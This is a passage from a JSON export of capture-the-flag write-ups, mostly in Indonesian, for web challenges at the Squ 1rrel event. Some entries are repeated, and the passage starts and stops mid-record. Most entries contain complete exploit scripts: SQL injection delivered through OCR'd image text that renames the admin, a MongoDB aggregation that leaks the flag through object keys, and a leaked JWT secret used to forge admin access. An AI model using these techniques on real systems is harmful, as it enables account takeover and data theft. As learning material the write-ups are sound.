range(d)]\r\n    cur_s, cur_ok, cur_flag = score(url, cur)\r\n    print(f\"[*] init tom_score={cur_s:.6f} threshold={threshold:.6f}\")\r\n    if cur_ok and cur_flag:\r\n        print(cur_flag)\r\n        return 0\r\n\r\n    best = cur[:]\r\n    best_s = cur_s\r\n\r\n    for it in range(1, args.iters + 1):\r\n        improved = False\r\n\r\n        # local random search around current best\r\n        for _ in range(args.batch):\r\n            cand = [best[i] + random.gauss(0.0, args.sigma) * (hi[i] - lo[i]) for i in range(d)]\r\n            cand = clip_vec(cand, lo, hi)\r\n            s, ok, flag = score(url, cand)\r\n            if ok and flag:\r\n                print(flag)\r\n                return 0\r\n            if s > best_s:\r\n                best_s = s\r\n                best = cand\r\n                improved = True\r\n\r\n        if improved:\r\n            cur = best[:]\r\n        else:\r\n            # occasional global restart to avoid local optima\r\n            cur = [random.uniform(lo[i], hi[i]) for i in range(d)]\r\n            s, ok, flag = score(url, cur)\r\n            if ok and flag:\r\n                print(flag)\r\n                return 0\r\n            if s > best_s:\r\n                best_s = s\r\n                best = cur[:]\r\n\r\n        if it % 20 == 0:\r\n            print(f\"[*] iter={it} best_tom={best_s:.6f}\")\r\n\r\n    print(f\"[!] not solved yet, best_tom={best_s:.6f} (< {threshold:.6f})\", file=sys.stderr)\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{test_flag}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-hackersboted",
    "title": "- hackersBOTted (web/misc)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Squ 1rrel",
    "tags": [],
    "description": "Challenge ini punya flow:\n- Upload foto ke `/api/spot`\n- Backend pakai Google Vision OCR/label/face untuk ekstrak teks\n- Tiap hasil deteksi dicek lewat fungsi `isAdmin(name)`",
    "problemDescription": "Challenge ini punya flow:\n- Upload foto ke `/api/spot`\n- Backend pakai Google Vision OCR/label/face untuk ekstrak teks\n- Tiap hasil deteksi dicek lewat fungsi `isAdmin(name)`\n\nMasalah utamanya ada di query SQL pada `backend/db.js`:\n\n```js\nconst query = `SELECT role FROM users WHERE name = '${cleaned}'`;\n```\n\nInput `name` tidak diparameterisasi. Sanitasi yang ada cuma hapus `--`, `/*`, `*/`, jadi masih bisa SQL injection pakai statement lain.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ide Eksploitasi",
        "content": "Karena `name` berasal dari OCR hasil gambar, payload SQL ditulis sebagai teks di dalam gambar lalu di-upload.\n\nTujuan exploit:\n1. Bypass pengecekan admin supaya request lanjut.\n2. Ubah username admin aktif (yang terus berotasi) jadi nilai yang kita tahu, misalnya `ownedadmin`.\n3. Panggil `/api/flag` dengan username itu.\n\nPayload yang dipakai:\n\n\n\nKenapa ini jalan:\n- `UNION SELECT 'user'` bikin baris pertama result punya role `user`, jadi fungsi `isAdmin` menganggap bukan admin.\n- `UPDATE users SET name='ownedadmin' WHERE role='admin'` mengganti nama admin acak saat ini ke `ownedadmin`.\n- Setelah itu, endpoint `/api/flag` menerima `ownedadmin` sebagai admin valid dan ngasih flag.",
        "code": "x' UNION SELECT 'user'; UPDATE users SET name='ownedadmin' WHERE role='admin'; SELECT 'user"
      },
      {
        "title": "Solver",
        "content": "File solver: `solve.py`\n\nJalankan:\n\n\n\nAtau pakai URL custom:\n\n\n\nScript akan:\n- generate gambar payload secara otomatis (Pillow)\n- kirim ke `/api/spot`\n- request `/api/flag` dengan username hasil takeover\n- print flag",
        "code": "source /home/nata/ctf_env/bin/activate\npython solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport io\r\nimport re\r\nimport sys\r\nimport time\r\n\r\nimport requests\r\nfrom PIL import Image, ImageDraw, ImageFont\r\n\r\nBASE_URL = \"http://hackersbotted.squ1rrel.dev\"\r\nADMIN_MARKER = \"ownedadmin\"\r\n\r\n\r\ndef build_payload_image(payload: str) -> bytes:\r\n    img = Image.new(\"RGB\", (3600, 260), \"white\")\r\n    draw = ImageDraw.Draw(img)\r\n\r\n    font_paths = [\r\n        \"/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf\",\r\n        \"/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf\",\r\n    ]\r\n    font = None\r\n    for fp in font_paths:\r\n        try:\r\n            font = ImageFont.truetype(fp, 58)\r\n            break\r\n        except OSError:\r\n            continue\r\n    if font is None:\r\n        font = ImageFont.load_default()\r\n\r\n    draw.text((20, 80), payload, fill=\"black\", font=font)\r\n    buf = io.BytesIO()\r\n    img.save(buf, format=\"PNG\")\r\n    return buf.getvalue()\r\n\r\n\r\ndef exploit(base_url: str) -> str:\r\n    session = requests.Session()\r\n\r\n    payload = (\r\n        \"x' UNION SELECT 'user'; \"\r\n        f\"UPDATE users SET name='{ADMIN_MARKER}' WHERE role='admin'; \"\r\n        \"SELECT 'user\"\r\n    )\r\n    image_bytes = build_payload_image(payload)\r\n\r\n    files = {\"photo\": (\"payload.png\", image_bytes, \"image/png\")}\r\n    data = {\"spotter\": \"alice\"}\r\n\r\n    # Trigger SQLi through OCR text in /api/spot\r\n    session.post(f\"{base_url}/api/spot\", files=files, data=data, timeout=20)\r\n\r\n    # Brief delay to avoid rate-limit edge and ensure update committed.\r\n    time.sleep(1.2)\r\n\r\n    r = session.post(\r\n        f\"{base_url}/api/flag\",\r\n        json={\"username\": ADMIN_MARKER},\r\n        timeout=20,\r\n    )\r\n    r.raise_for_status()\r\n    j = r.json()\r\n    if \"flag\" not in j:\r\n        raise RuntimeError(f\"Flag not found in response: {j}\")\r\n    return j[\"flag\"]\r\n\r\n\r\ndef main() -> None:\r\n    base = sys.argv[1] if len(sys.argv) > 1 else BASE_URL\r\n    flag = exploit(base)\r\n\r\n    if not re.match(r\"^[A-Za-z0-9_{}\\-]+$\", flag):\r\n        print(flag)\r\n        return\r\n\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{g3t_sp0773d_b0z0_l0l}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-mongolia",
    "title": "- web/mongolia",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Squ 1rrel",
    "tags": [],
    "description": "Writeup for challenge - web/mongolia",
    "problemDescription": "Challenge ini kasih web yang bisa:\n1. `POST /api/connect` untuk connect ke MongoDB remote dengan credential internal.\n2. `GET /api/journals` untuk baca jurnal non-secret.\n3. `POST /api/query` untuk jalankan aggregation pipeline user.\n\nData `secret:true` berisi `journal = FLAG` yang diulang 20x.\nServer mencoba nyensor flag pakai `stripFlag()`, tapi hanya ke **value**, bukan **nama key object**.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Vulnerability",
        "content": "Di `index.js` ada fungsi:\n\n- `stripFlag(obj)`\n- Kalau `obj` string -> replace `FLAG` jadi `[REDACTED]`\n- Kalau `obj` object -> loop `for (const [k, v] of Object.entries(obj)) out[k] = stripFlag(v)`\n\nMasalahnya: `k` (nama field) tidak pernah disanitasi.\n\nEndpoint `POST /api/query` masih mengizinkan stage `$group`, dan operator `$arrayToObject` tidak masuk blacklist regex.\nArtinya kita bisa bikin object dinamis dengan key dari field `$journal` (yang berisi flag)."
      },
      {
        "title": "Payload Exploit",
        "content": "Pipeline yang dipakai:\n\n\n\nHasilnya kurang lebih:\n\n\n\nKarena flag ada di **key** object, `stripFlag()` tidak redaksi.\nLalu tinggal regex ambil token pertama `squ1rrel{...}`.",
        "code": "[\n  {\"$match\": {\"secret\": true}},\n  {\"$limit\": 1},\n  {\n    \"$group\": {\n      \"_id\": {\n        \"$arrayToObject\": [[{\"k\": \"$journal\", \"v\": 1}]]\n      }\n    }\n  }\n]"
      },
      {
        "title": "Solver",
        "content": "File solver sudah disimpan di:\n- `solver.py`\n\nJalankan:\n\n\n\nOutput:",
        "code": "source /home/nata/ctf_env/bin/activate\ncd /home/nata/ctf/squ1rrel/web/mongolia/dist\npython3 solver.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport json\r\nimport sys\r\nimport requests\r\n\r\nBASE_URL = \"https://mongolia.squ1rrel.dev\"\r\nMONGO_TARGET = \"136.112.223.118:5051/mongolia\"\r\n\r\n\r\ndef connect_session():\r\n    resp = requests.post(\r\n        f\"{BASE_URL}/api/connect\",\r\n        json={\"url\": MONGO_TARGET},\r\n        timeout=20,\r\n    )\r\n    resp.raise_for_status()\r\n    data = resp.json()\r\n    token = data.get(\"token\")\r\n    if not token:\r\n        raise RuntimeError(f\"No token in response: {data}\")\r\n    return token\r\n\r\n\r\ndef query_leak(token: str):\r\n    # Leak trick: put $journal as object key via $arrayToObject.\r\n    # stripFlag() only sanitizes values, not object keys.\r\n    pipeline = [\r\n        {\"$match\": {\"secret\": True}},\r\n        {\"$limit\": 1},\r\n        {\r\n            \"$group\": {\r\n                \"_id\": {\r\n                    \"$arrayToObject\": [\r\n                        [\r\n                            {\r\n                                \"k\": \"$journal\",\r\n                                \"v\": 1,\r\n                            }\r\n                        ]\r\n                    ]\r\n                }\r\n            }\r\n        },\r\n    ]\r\n\r\n    resp = requests.post(\r\n        f\"{BASE_URL}/api/query\",\r\n        headers={\"x-session-token\": token, \"content-type\": \"application/json\"},\r\n        json={\"pipeline\": json.dumps(pipeline)},\r\n        timeout=30,\r\n    )\r\n    resp.raise_for_status()\r\n    data = resp.json()\r\n    if not isinstance(data, list) or not data:\r\n        raise RuntimeError(f\"Unexpected query response: {data}\")\r\n    leaked_obj = data[0].get(\"_id\", {})\r\n    if not isinstance(leaked_obj, dict) or not leaked_obj:\r\n        raise RuntimeError(f\"Leak failed, _id not object: {data[0]}\")\r\n\r\n    # Key contains flag repeated many times.\r\n    leaked_key = next(iter(leaked_obj.keys()))\r\n    return leaked_key\r\n\r\n\r\ndef extract_flag(text: str):\r\n    m = re.search(r\"squ1rrel\\{[^}]+\\}\", text)\r\n    if not m:\r\n        raise RuntimeError(\"Flag pattern not found in leaked content\")\r\n    return m.group(0)\r\n\r\n\r\ndef main():\r\n    token = connect_session()\r\n    leaked_text = query_leak(token)\r\n    flag = extract_flag(leaked_text)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        main()\r\n    except Exception as exc:\r\n        print(f\"[!] {exc}\", file=sys.stderr)\r\n        sys.exit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{3rli4nh0tu4h_zin4li?}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-rails",
    "title": "- web/rails",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Squ 1rrel",
    "tags": [],
    "description": "Writeup for challenge - web/rails",
    "problemDescription": "Challenge ini punya dua bug yang kalau digabung jadi full chain:\n1. **Unsafe constantize** di endpoint `/show/:resource`.\n2. **Auth JWT lemah** di middleware admin (cukup valid signature, tanpa validasi claim).\n\nTerus ada bug kecil lagi di controller admin:\n- Filter blokir `id == \"1\"` bisa dibypass pakai input seperti `01`, tapi query DB tetap resolve ke row `id=1`.\n\nKombinasi tiga hal itu langsung ngasih flag.",
    "tools": [],
    "analysis": "Endpoint yang hidup dan menarik:\n- `GET /up` -> health check.\n- `GET /admin` -> `401 Missing Admin Authentication Cookie`.\n- `GET /show/:resource` -> endpoint dinamis.\n\nDari source challenge:\n- `ShowController#index` membentuk nama class dari user input:\n  - `resource_name = @resource + \"Module\"`\n  - `resource_name.constantize.new.show`\n- Ada class `JWTModule < JWTSecret`.\n- `JWTSecret#show` return secret JWT (ENV `JWT_SECRET` atau random saat boot).\n\nArtinya `/show/JWT` akan memanggil `JWTModule#show` yang mewarisi method dari `JWTSecret` dan membocorkan signing key.",
    "solution": [
      {
        "title": "1) Secret Disclosure via constantize",
        "content": "`/show/JWT` mengembalikan secret signing JWT aplikasi."
      },
      {
        "title": "2) Weak JWT Validation di `/admin`",
        "content": "Middleware `AdminAuth` hanya melakukan:\n- Ambil cookie `auth`\n- `JWT.decode(token, hmac_secret, true, { algorithm: 'HS256' })`\n\nTidak ada cek role/admin claim sama sekali. Jadi asal token ditandatangani dengan secret yang benar, request dianggap lolos."
      },
      {
        "title": "3) ID Guard Bypass",
        "content": "Di `Admin::PostsController#index`:\n- Jika `id == \"1\"` -> raise error.\n- Lalu query: `Post.where(id: params[:id]).first`\n\nInput `01` tidak sama dengan string literal `\"1\"`, jadi guard tidak aktif. Tapi DB tetap menafsirkan nilai itu sebagai id 1, sehingga post terlarang tetap terbaca."
      },
      {
        "title": "Langkah Eksploitasi",
        "content": "1. Leak secret:\n   - Request `GET /show/JWT`\n2. Forge JWT HS256 dengan secret tadi:\n   - payload bebas (misal `{ \"user\": \"admin\" }`)\n3. Akses endpoint admin dengan cookie `auth=<token>`\n4. Bypass guard id:\n   - `GET /admin/posts?id=01`\n5. Ambil `data.content` -> flag."
      },
      {
        "title": "Solver",
        "content": "File solver sudah disimpan di:\n- `solver.py`\n\nCara pakai:\n\n\nOpsional target custom:",
        "code": "source /home/nata/ctf_env/bin/activate\ncd /home/nata/ctf/squ1rrel/web/rails/rails-ctf-dist\npython3 solver.py"
      },
      {
        "title": "Catatan Hardening",
        "content": "Kalau ini aplikasi beneran, perbaikannya:\n- Jangan pakai `constantize` dari input user.\n- Jangan expose class sensitif melalui endpoint generik.\n- JWT admin wajib validasi claim (`role == admin`, `exp`, `aud`, dll).\n- Hindari guard berbasis string literal untuk ID, gunakan check yang konsisten dengan tipe data."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport sys\r\nimport requests\r\nimport jwt\r\n\r\nBASE_URL = \"https://rails.squ1rrel.dev\"\r\nTIMEOUT = 10\r\n\r\n\r\ndef get_jwt_secret(base_url: str) -> str:\r\n    r = requests.get(f\"{base_url}/show/JWT\", timeout=TIMEOUT)\r\n    r.raise_for_status()\r\n    data = r.json()\r\n    secret = data.get(\"data\")\r\n    if not secret:\r\n        raise RuntimeError(\"JWT secret tidak ditemukan dari /show/JWT\")\r\n    return secret\r\n\r\n\r\ndef forge_token(secret: str) -> str:\r\n    payload = {\"user\": \"admin\"}\r\n    return jwt.encode(payload, secret, algorithm=\"HS256\")\r\n\r\n\r\ndef get_flag(base_url: str, token: str) -> str:\r\n    # Bypass guard id == \"1\" dengan varian numerik yang tetap match ke row id=1 di DB\r\n    params = {\"id\": \"01\"}\r\n    cookies = {\"auth\": token}\r\n    r = requests.get(f\"{base_url}/admin/posts\", params=params, cookies=cookies, timeout=TIMEOUT)\r\n    r.raise_for_status()\r\n\r\n    j = r.json()\r\n    content = (((j or {}).get(\"data\") or {}).get(\"content\"))\r\n    if not content:\r\n        raise RuntimeError(\"Konten post tidak ditemukan\")\r\n    return content\r\n\r\n\r\ndef main():\r\n    base = BASE_URL\r\n    if len(sys.argv) > 1:\r\n        base = sys.argv[1].rstrip(\"/\")\r\n\r\n    secret = get_jwt_secret(base)\r\n    token = forge_token(secret)\r\n    flag = get_flag(base, token)\r\n\r\n    print(\"[+] JWT Secret:\", secret)\r\n    print(\"[+] Forged Token:\", token)\r\n    print(\"[+] Flag:\", flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{rails?_in_my_ctf???}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-misc-soulmate-challenge",
    "title": "- misc/soulmate",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Squ 1rrel",
    "tags": [],
    "description": "Challenge ini kelihatan seperti web app AI biasa, tapi inti bug-nya ada di **design API**.",
    "problemDescription": "Challenge ini kelihatan seperti web app AI biasa, tapi inti bug-nya ada di **design API**.",
    "tools": [],
    "analysis": "Saya mulai dengan baca source utama:\n- `backend/app.py`\n- `models/inference.py`\n- frontend JS untuk melihat endpoint yang dipanggil.\n\nEndpoint penting:\n- `GET /generate-random` -> generate wajah dari seed tanggal lahir\n- `POST /submit-u` -> menerima vektor kontrol `u` (dimensi PCA), lalu:\n  1. `u` di-clip ke batas bawah/atas\n  2. diubah ke latent `w`\n  3. digenerate jadi image\n  4. diskor classifier selebriti\n  5. kalau `tom_score >= 0.15`, server mengembalikan `flag`",
    "solution": [
      {
        "title": "2) Akar masalah",
        "content": "`/submit-u` membuka akses langsung ke ruang kontrol latent (`u`) **dan mengembalikan nilai objektif** (`tom_score`) setiap request.\n\nArtinya, endpoint ini jadi **oracle optimasi**. Kita tidak perlu ngerti model internal, cukup lakukan black-box optimization untuk memaksimalkan `tom_score` sampai melewati threshold.\n\nTambahan petunjuk dari artefak challenge:\n- ada file `checkpoints/pca_basis_d8_tom_weighted.npz`\n- ini mengindikasikan basis PCA memang sudah dibentuk agar arah tertentu lebih condong ke kelas Tom Cruise.\n\nJadi eksploit realistisnya: cari `u` yang mendorong score >= threshold."
      },
      {
        "title": "3) Eksploitasi",
        "content": "Saya buat solver otomatis `solve.py`:\n- query `GET /health` untuk ambil:\n  - `control_dim`\n  - `u_lower`, `u_upper`\n  - `tom_score_threshold`\n- inisialisasi `u` di tengah batas\n- lakukan random local search + restart global:\n  - sampling kandidat di sekitar best saat ini\n  - clip ke range valid\n  - kirim ke `/submit-u`\n  - pakai `tom_score` sebagai feedback\n- stop ketika response `success=true` dan `flag` muncul\n\nPendekatan ini murni black-box dan stabil untuk service yang ngasih score per request."
      },
      {
        "title": "4) Hasil pada instance lokal",
        "content": "Pada environment lokal challenge ini, flag tersedia sebagai:\n\n`squ1rrel{test_flag}`"
      },
      {
        "title": "5) Catatan keamanan",
        "content": "Fix yang benar (kombinasi):\n- jangan expose endpoint latent-control mentah ke user publik,\n- jangan kembalikan score kontinu yang bisa dipakai sebagai oracle,\n- rate limit + anomaly detection untuk query optimasi,\n- verifikasi challenge condition di sisi internal yang tidak bisa di-query berulang secara bebas."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport random\r\nimport sys\r\nfrom typing import List, Tuple\r\n\r\nimport requests\r\n\r\n\r\ndef clip_vec(v: List[float], lo: List[float], hi: List[float]) -> List[float]:\r\n    return [max(lo[i], min(hi[i], float(v[i]))) for i in range(len(v))]\r\n\r\n\r\ndef score(url: str, u: List[float], timeout: float = 30.0) -> Tuple[float, bool, str]:\r\n    r = requests.post(\r\n        f\"{url}/submit-u\",\r\n        json={\"u\": u, \"include_image\": False},\r\n        timeout=timeout,\r\n    )\r\n    r.raise_for_status()\r\n    data = r.json()\r\n    return float(data.get(\"tom_score\", 0.0)), bool(data.get(\"success\", False)), str(data.get(\"flag\", \"\"))\r\n\r\n\r\ndef main() -> int:\r\n    ap = argparse.ArgumentParser(description=\"Soulmate solver\")\r\n    ap.add_argument(\"url\", help=\"Base URL target, ex: http://127.0.0.1:8000\")\r\n    ap.add_argument(\"--iters\", type=int, default=2000)\r\n    ap.add_argument(\"--seed\", type=int, default=1337)\r\n    ap.add_argument(\"--sigma\", type=float, default=0.35)\r\n    ap.add_argument(\"--batch\", type=int, default=40)\r\n    args = ap.parse_args()\r\n\r\n    random.seed(args.seed)\r\n    url = args.url.rstrip(\"/\")\r\n\r\n    h = requests.get(f\"{url}/health\", timeout=20).json()\r\n    d = int(h[\"control_dim\"])\r\n    lo = list(map(float, h[\"u_lower\"]))\r\n    hi = list(map(float, h[\"u_upper\"]))\r\n    threshold = float(h[\"tom_score_threshold\"])\r\n\r\n    # Start from center of bounds\r\n    cur = [(lo[i] + hi[i]) * 0.5 for i in range(d)]\r\n    cur_s, cur_ok, cur_flag = score(url, cur)\r\n    print(f\"[*] init tom_score={cur_s:.6f} threshold={threshold:.6f}\")\r\n    if cur_ok and cur_flag:\r\n        print(cur_flag)\r\n        return 0\r\n\r\n    best = cur[:]\r\n    best_s = cur_s\r\n\r\n    for it in range(1, args.iters + 1):\r\n        improved = False\r\n\r\n        # local random search around current best\r\n        for _ in range(args.batch):\r\n            cand = [best[i] + random.gauss(0.0, args.sigma) * (hi[i] - lo[i]) for i in range(d)]\r\n            cand = clip_vec(cand, lo, hi)\r\n            s, ok, flag = score(url, cand)\r\n            if ok and flag:\r\n                print(flag)\r\n                return 0\r\n            if s > best_s:\r\n                best_s = s\r\n                best = cand\r\n                improved = True\r\n\r\n        if improved:\r\n            cur = best[:]\r\n        else:\r\n            # occasional global restart to avoid local optima\r\n            cur = [random.uniform(lo[i], hi[i]) for i in range(d)]\r\n            s, ok, flag = score(url, cur)\r\n            if ok and flag:\r\n                print(flag)\r\n                return 0\r\n            if s > best_s:\r\n                best_s = s\r\n                best = cur[:]\r\n\r\n        if it % 20 == 0:\r\n            print(f\"[*] iter={it} best_tom={best_s:.6f}\")\r\n\r\n    print(f\"[!] not solved yet, best_tom={best_s:.6f} (< {threshold:.6f})\", file=sys.stderr)\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{test_flag}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-hackersboted-dist",
    "title": "- hackersBOTted (web/misc)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Squ 1rrel",
    "tags": [],
    "description": "Challenge ini punya flow:\n- Upload foto ke `/api/spot`\n- Backend pakai Google Vision OCR/label/face untuk ekstrak teks\n- Tiap hasil deteksi dicek lewat fungsi `isAdmin(name)`",
    "problemDescription": "Challenge ini punya flow:\n- Upload foto ke `/api/spot`\n- Backend pakai Google Vision OCR/label/face untuk ekstrak teks\n- Tiap hasil deteksi dicek lewat fungsi `isAdmin(name)`\n\nMasalah utamanya ada di query SQL pada `backend/db.js`:\n\n```js\nconst query = `SELECT role FROM users WHERE name = '${cleaned}'`;\n```\n\nInput `name` tidak diparameterisasi. Sanitasi yang ada cuma hapus `--`, `/*`, `*/`, jadi masih bisa SQL injection pakai statement lain.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ide Eksploitasi",
        "content": "Karena `name` berasal dari OCR hasil gambar, payload SQL ditulis sebagai teks di dalam gambar lalu di-upload.\n\nTujuan exploit:\n1. Bypass pengecekan admin supaya request lanjut.\n2. Ubah username admin aktif (yang terus berotasi) jadi nilai yang kita tahu, misalnya `ownedadmin`.\n3. Panggil `/api/flag` dengan username itu.\n\nPayload yang dipakai:\n\n\n\nKenapa ini jalan:\n- `UNION SELECT 'user'` bikin baris pertama result punya role `user`, jadi fungsi `isAdmin` menganggap bukan admin.\n- `UPDATE users SET name='ownedadmin' WHERE role='admin'` mengganti nama admin acak saat ini ke `ownedadmin`.\n- Setelah itu, endpoint `/api/flag` menerima `ownedadmin` sebagai admin valid dan ngasih flag.",
        "code": "x' UNION SELECT 'user'; UPDATE users SET name='ownedadmin' WHERE role='admin'; SELECT 'user"
      },
      {
        "title": "Solver",
        "content": "File solver: `solve.py`\n\nJalankan:\n\n\n\nAtau pakai URL custom:\n\n\n\nScript akan:\n- generate gambar payload secara otomatis (Pillow)\n- kirim ke `/api/spot`\n- request `/api/flag` dengan username hasil takeover\n- print flag",
        "code": "source /home/nata/ctf_env/bin/activate\npython solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport io\r\nimport re\r\nimport sys\r\nimport time\r\n\r\nimport requests\r\nfrom PIL import Image, ImageDraw, ImageFont\r\n\r\nBASE_URL = \"http://hackersbotted.squ1rrel.dev\"\r\nADMIN_MARKER = \"ownedadmin\"\r\n\r\n\r\ndef build_payload_image(payload: str) -> bytes:\r\n    img = Image.new(\"RGB\", (3600, 260), \"white\")\r\n    draw = ImageDraw.Draw(img)\r\n\r\n    font_paths = [\r\n        \"/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf\",\r\n        \"/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf\",\r\n    ]\r\n    font = None\r\n    for fp in font_paths:\r\n        try:\r\n            font = ImageFont.truetype(fp, 58)\r\n            break\r\n        except OSError:\r\n            continue\r\n    if font is None:\r\n        font = ImageFont.load_default()\r\n\r\n    draw.text((20, 80), payload, fill=\"black\", font=font)\r\n    buf = io.BytesIO()\r\n    img.save(buf, format=\"PNG\")\r\n    return buf.getvalue()\r\n\r\n\r\ndef exploit(base_url: str) -> str:\r\n    session = requests.Session()\r\n\r\n    payload = (\r\n        \"x' UNION SELECT 'user'; \"\r\n        f\"UPDATE users SET name='{ADMIN_MARKER}' WHERE role='admin'; \"\r\n        \"SELECT 'user\"\r\n    )\r\n    image_bytes = build_payload_image(payload)\r\n\r\n    files = {\"photo\": (\"payload.png\", image_bytes, \"image/png\")}\r\n    data = {\"spotter\": \"alice\"}\r\n\r\n    # Trigger SQLi through OCR text in /api/spot\r\n    session.post(f\"{base_url}/api/spot\", files=files, data=data, timeout=20)\r\n\r\n    # Brief delay to avoid rate-limit edge and ensure update committed.\r\n    time.sleep(1.2)\r\n\r\n    r = session.post(\r\n        f\"{base_url}/api/flag\",\r\n        json={\"username\": ADMIN_MARKER},\r\n        timeout=20,\r\n    )\r\n    r.raise_for_status()\r\n    j = r.json()\r\n    if \"flag\" not in j:\r\n        raise RuntimeError(f\"Flag not found in response: {j}\")\r\n    return j[\"flag\"]\r\n\r\n\r\ndef main() -> None:\r\n    base = sys.argv[1] if len(sys.argv) > 1 else BASE_URL\r\n    flag = exploit(base)\r\n\r\n    if not re.match(r\"^[A-Za-z0-9_{}\\-]+$\", flag):\r\n        print(flag)\r\n        return\r\n\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "squ1rrel{g3t_sp0773d_b0z0_l0l}",
    "lessonsLearned": ""
  },
  {
    "id": "squ1rrel-web-mongolia-dist",
    "title": "- web/mongolia",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Squ 1rrel",
    "tags": [],
    "description": "Writeup for challenge - web/mongolia",
    "problemDescription": "Challenge ini kasih web yang bisa:\n1. `POST /api/connect` untuk connect ke MongoDB remote dengan credential internal.\n2. `GET /api/journals` untuk baca jurnal non-secret.\n3. `POST /api/query` untuk jalankan aggregation pipeline user.\n\nData `secret:true` berisi `journal = FLAG` yang diulang 20x.\nServer mencoba nyensor flag pakai `stripFlag()`, tapi hanya ke **value**, bukan **nama key object**.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Vulnerability",
        "content": "Di `index.js` ada fungsi:\n\n- `stripFlag(obj)`\n- Kalau `obj` string -> replace `FLAG` jadi `[REDACTED]`\n- Kalau `obj` object -> loop `for (const [k, v] of Object.entries(obj)) out[k] = stripFlag(v)`\n\nMasalahnya: `k` (nama field) tidak pernah disanitasi.\n\nEndpoint `POST /api/query` masih mengizinkan stage `$group`, dan operator `$arrayToObject` tidak masuk blacklist regex.\nArtinya kita bisa bikin object dinamis dengan key dari field `$journal` (yang berisi flag)."
      },
      {
        "title": "Payload Exploit",
        "content": "Pipeline yang dipakai:\n\n\n\nHasilnya kurang lebih:\n\n\n\nKarena flag ada di **key** object, `stripFlag()` tidak redaksi.\nLalu tinggal regex ambil token pertama `squ1rrel{...}`.",
        "code": "[\n  {\"$match\": {\"secret\": true}},\n  {\"$limit\": 1},\n  {\n    \"$group\": {\n      \"_id\": {\n        \"$arrayToObject\": [[{\"k\": \"$journal\", \"v\": 1}]]\n      }\n    }\n  }\n]"
      },
      {
        "title": "Solver",
        "content": "File solver sudah disimpan di:\n- `solver.py`\n\nJalankan:\n\n\n\nOutput:",
        "code": "source /home/nata/ctf_env/bin/activate\ncd /home/nata/ctf/squ1rrel/web/mongolia/dist\npython3 solver.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport json\r\nimport sys\r\nimport requests\r\n\r\nBASE_URL = \"https://mongolia.squ1rrel.dev\"\r\nMONGO_TARGET = \"136.112.223.118:5051/mongolia\"\r\n\r\n\r\ndef connect_session():\r\n    resp = requests.post(\r\n        f\"{BASE_URL}/api/connect\",\r\n        json={\"url\": MONGO_TARGET},\r\n        timeout=20,\r\n    )\r\n    resp.raise_for_status()\r\n    data = resp.json()\r\n    token = data.get(\"token\")\r\n    if not token:\r\n        raise RuntimeError(f\"No token in response: {data}\")\r\n    return token\r\n\r\n\r\ndef query_leak(token: str):\r\n    # Leak trick: put $journal as object key via $arrayToObject.\r\n    # stripFlag() only sanitizes values, not object keys.\r\n    pipeline = [\r\n        {\"$match\": {\"secret\": True}},\r\n        {\"$limit\": 1},\r\n        {\r\n            \"$group\": {\r\n                \"_id\": {\r\n                    \"$arrayToObject\": [\r\n                        [\r\n                            {\r\n                                \"k\": \"$journal\",\r\n                                \"v\": 1,\r\n                            }\r\n                        ]\r\n                    ]\r\n                }\r\n            }\r\n        },\r\n    ]\r\n\r\n    resp = requests.post(\r\n        f\"{BASE_URL}/api/query\",\r\n        headers={\"x-session-token\": token, \"content-type\": \"application/json\"},\r\n        